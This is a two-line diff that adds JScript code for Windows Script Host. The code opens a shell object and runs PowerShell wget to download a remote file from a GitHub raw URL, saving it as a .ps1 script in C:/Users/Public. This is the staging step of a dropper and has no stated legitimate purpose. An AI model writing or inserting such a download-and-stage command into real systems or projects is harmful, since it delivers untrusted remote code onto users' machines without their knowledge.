@@ -1,0 +1,2 @@
+var shell = WScript.CreateObject("WScript.Shell");
+shell.Run("powershell wget https://github.com/IrfanNian/medeploy/raw/main/mdeploy.txt -O C:/Users/Public/mde.ps1");
